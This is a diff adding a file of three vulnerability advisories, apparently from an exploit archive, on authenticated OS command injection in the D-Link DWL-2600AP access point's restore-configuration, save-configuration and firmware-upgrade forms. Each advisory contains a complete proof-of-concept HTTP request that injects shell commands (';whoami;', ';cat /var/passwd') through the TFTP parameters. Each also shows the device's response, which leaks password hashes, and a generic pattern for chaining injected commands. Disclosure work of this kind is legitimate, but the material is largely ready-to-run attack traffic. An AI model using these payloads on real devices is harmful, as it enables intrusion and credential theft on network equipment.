@@ -1,0 +1,356 @@
+Document Title:
+===============
+D-Link DWL-2600AP - (Authenticated) OS Command Injection (Restore Configuration)
+
+Product & Service Introduction:
+===============================
+The D-Link DWL-2600AP has a web interface for configuration. You can use any web browser you like to login to the D-Link DWL-2600AP.
+
+Affected Product(s):
+====================
+Product: D-Link DWL-2600AP (Web Interface)
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+Severity Level:
+===============
+HIGH
+
+CVE: CVE-2019-20499
+CVE: CVE-2019-20500
+CVE: CVE-2019-20501
+
+
+Base Score (CVSS):
+===============
+7.8
+
+===============
+Request Method(s):
+[+] POST
+
+URL Path :
+[+] /admin.cgi?action=config_restore
+
+Vulnerable POST Form Data Parameter:
+[+] configRestore
+[+] configServerip
+===========================
+Device Firmware version :
+[+] 4.2.0.15
+
+Hardware Version :
+[+] A1
+
+Device name :
+[+] D-Link AP
+
+Product Identifier : 
+[+] WLAN-EAP
+
+Proof of Concept (PoC):
+=======================
+The security vulnerability can be exploited by local authenticated attackers.
+there is no input validation on the POST Form Data Parameter "configRestore"
+and the Form Data Parameter "configServerip" (the input are passed directly to TFTP command) which allow attackers to execute arbitrary Operating System Commands on the device for malicious purposes.
+The attacker has to know the credentials in order to access the Panel .
+For security demonstration or to reproduce the vulnerability follow the provided information in the attachement provided Screenshot2.jpg .
+
+
+--- PoC Session Logs ---
+POST /admin.cgi?action=config_restore HTTP/1.1
+Host: localhost
+Connection: keep-alive
+Content-Length: 357
+Cache-Control: max-age=0
+Origin: http://localhost
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; 
+User-Agent: Xxxxxxxx
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://localhost/admin.cgi?action=config_restore
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4
+Cookie: sessionHTTP=UQAafLpviZXbWDQpJAnrNmEJoFQIBAcX; clickedFolderFrameless=43%5E
+
+------WebKitFormBoundary4ZAwHsdySFjwNXxE
+Content-Disposition: form-data; name="optprotocol"
+
+up
+------WebKitFormBoundary4ZAwHsdySFjwNXxE
+Content-Disposition: form-data; name="configRestore"
+
+;whoami;
+------WebKitFormBoundary4ZAwHsdySFjwNXxE
+Content-Disposition: form-data; name="configServerip"
+
+;cat /var/passwd;cat /var/passwd
+------WebKitFormBoundary4ZAwHsdySFjwNXxE--
+
+
+----------->Response----------->
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=UTF-8
+
+/usr/bin/tftp: option requires an argument -- r
+BusyBox v1.18.2 (2018-02-26 11:53:37 IST) multi-call binary.
+
+Usage: tftp [OPTIONS] HOST [PORT]
+
+Transfer a file from/to tftp server
+
+Options:
+	-l FILE	Local FILE
+	-r FILE	Remote FILE
+	-g	Get file
+	-p	Put file
+	-b SIZE	Transfer blocks of SIZE octets
+
+sh: whoami: not found
+sh: whoami: not found
+root:$1$XDXDXDXD$JTedJSDYDA.pFjIToxlGA1:0:0:root:/root:/bin/sh
+admin:2yn.4fvaTgedM:0:0:cisco:/root:/bin/splash
+nobody:x:99:99:nobody:/:/bin/false
+
+Note : for testing put the values in the fields like this : 
+;command1;same_command1;command2;command2
+
+
+----+Discovered By Raki Ben Hamouda----+
+
+
+Document Title:
+===============
+D-Link DWL-2600AP - (Authenticated) OS Command Injection (Save Configuration)
+
+Product & Service Introduction:
+===============================
+The D-Link DWL-2600AP has a web interface for configuration. You can use any web browser you like to login to the D-Link DWL-2600AP.
+
+Affected Product(s):
+====================
+Product: D-Link DWL-2600AP (Web Interface)
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+Severity Level:
+===============
+HIGH
+
+Base Score (CVSS):
+===============
+7.8
+
+===============
+Request Method(s):
+[+] POST
+
+URL Path :
+[+] /admin.cgi?action=config_save
+
+Vulnerable POST Form Data Parameter:
+[+] configBackup
+[+] downloadServerip
+==========================
+Device Firmware version :
+[+] 4.2.0.15
+
+Hardware Version :
+[+] A1
+
+Device name :
+[+] D-Link AP
+
+Product Identifier : 
+[+] WLAN-EAP
+
+Proof of Concept (PoC):
+=======================
+The security vulnerability can be exploited by remote or local authenticated attackers.
+there is no input validation on the POST Form Data Parameter "configBackup"
+and the Form Data Parameter "downloadServerip" (the input are passed directly to TFTP command) which allow attackers to execute arbitrary Operating System Commands on the device for malicious purposes.
+The attacker has to know the credentials in order to access the Panel .
+For security demonstration or to reproduce the vulnerability follow the provided information in the attachement provided Screenshot3.jpg .
+
+--- PoC Session Logs ---
+POST /admin.cgi?action=config_save HTTP/1.1
+Host: localhost
+Connection: keep-alive
+Content-Length: 114
+Cache-Control: max-age=0
+Origin: http://localhost
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Xxxxxxxx
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://localhost/admin.cgi?action=config_save
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4
+Cookie: sessionHTTP=PENcqbtRRuvmuZfPZnzuUddVIEAPADBp; clickedFolderFrameless=43%5E
+
+check_tftp=up&configBackup=;whoami;whoami;.xml&downloadServerip=;cat /var/passwd;cat /var/passwd
+
+
+----------->Response----------->
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=UTF-8
+
+/usr/bin/tftp: option requires an argument -- r
+BusyBox v1.18.2 (2018-02-26 11:53:37 IST) multi-call binary.
+
+Usage: tftp [OPTIONS] HOST [PORT]
+
+Transfer a file from/to tftp server
+
+Options:
+	-l FILE	Local FILE
+	-r FILE	Remote FILE
+	-g	Get file
+	-p	Put file
+	-b SIZE	Transfer blocks of SIZE octets
+
+sh: whoami: not found
+sh: whoami: not found
+sh: .xml: not found
+root:$1$XDXDXDXD$JTedJSDYDA.pFjIToxlGA1:0:0:root:/root:/bin/sh
+admin:2yn.4fvaTgedM:0:0:cisco:/root:/bin/splash
+nobody:x:99:99:nobody:/:/bin/false
+
+Note : for testing put the values in the fields like this : 
+;command1;same_command1;command2;etc...
+
+
+----+Discovered By Raki Ben Hamouda----+
+
+
+Document Title:
+===============
+D-Link DWL-2600AP - (Authenticated) OS Command Injection (Upgrade Firmware)
+
+Product & Service Introduction:
+===============================
+The D-Link DWL-2600AP has a web interface for configuration. You can use any web browser you like to login to the D-Link DWL-2600AP.
+
+Affected Product(s):
+====================
+Product: D-Link DWL-2600AP (Web Interface)
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+Severity Level:
+===============
+HIGH
+
+Base Score (CVSS):
+===============
+7.8
+
+===============
+Request Method(s):
+[+] POST
+
+URL Path :
+[+] /admin.cgi?action=upgrade
+
+Vulnerable POST Form Data Parameter:
+[+] firmwareRestore
+[+] firmwareServerip
+
+===========================
+Device Firmware version :
+[+] 4.2.0.15
+
+Hardware Version :
+[+] A1
+
+Device name :
+[+] D-Link AP
+
+Product Identifier : 
+[+] WLAN-EAP
+
+Proof of Concept (PoC):
+=======================
+The security vulnerability can be exploited by local authenticated attackers.
+there is no input validation on the POST Form Data Parameter "firmwareRestore"
+and the Form Data Parameter "firmwareServerip" (the input are passed directly to TFTP command) which allow attackers to execute arbitrary Operating System Commands on the device for malicious purposes.
+The attacker has to know the credentials in order to access the Panel .
+For security demonstration or to reproduce the vulnerability follow the provided information in the attachement provided Screenshot1.jpg .
+
+--- PoC Session Logs ---
+
+POST /admin.cgi?action=upgrade HTTP/1.1
+Host: localhost
+Connection: keep-alive
+Content-Length: 525
+Cache-Control: max-age=0
+Origin: http://localhost
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data;
+User-Agent: xxxxxxxxw
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://localhost/admin.cgi?action=upgrade
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4
+Cookie: sessionHTTP=PENcqbtRRuvmuZfPZnzuUddVIEAPADBp; clickedFolderFrameless=43%5E
+
+------WebKitFormBoundaryBy0MsFaBOhdU6YJL
+Content-Disposition: form-data; name="optprotocol"
+
+up
+------WebKitFormBoundaryBy0MsFaBOhdU6YJL
+Content-Disposition: form-data; name="firmwareRestore"
+
+;whoami;whoami
+------WebKitFormBoundaryBy0MsFaBOhdU6YJL
+Content-Disposition: form-data; name="firmwareServerip"
+
+;cat /var/passwd;cat /var/passwd
+------WebKitFormBoundaryBy0MsFaBOhdU6YJL
+Content-Disposition: form-data; name="update.device.packet-capture.stop-capture"
+
+up
+------WebKitFormBoundaryBy0MsFaBOhdU6YJL--
+
+----------->Response----------->
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=UTF-8
+
+/usr/bin/tftp: option requires an argument -- r
+BusyBox v1.18.2 (2018-02-26 11:53:37 IST) multi-call binary.
+
+Usage: tftp [OPTIONS] HOST [PORT]
+
+Transfer a file from/to tftp server
+
+Options:
+	-l FILE	Local FILE
+	-r FILE	Remote FILE
+	-g	Get file
+	-p	Put file
+	-b SIZE	Transfer blocks of SIZE octets
+
+sh: whoami: not found
+sh: whoami: not found
+root:$1$XDXDXDXD$JTedJSDYDA.pFjIToxlGA1:0:0:root:/root:/bin/sh
+admin:2yn.4fvaTgedM:0:0:cisco:/root:/bin/splash
+nobody:x:99:99:nobody:/:/bin/false
+
+Note : for testing put the values in the fields like this : 
+;command1;same_command1;command2;etc...
+----+Discovered By Raki Ben Hamouda----+
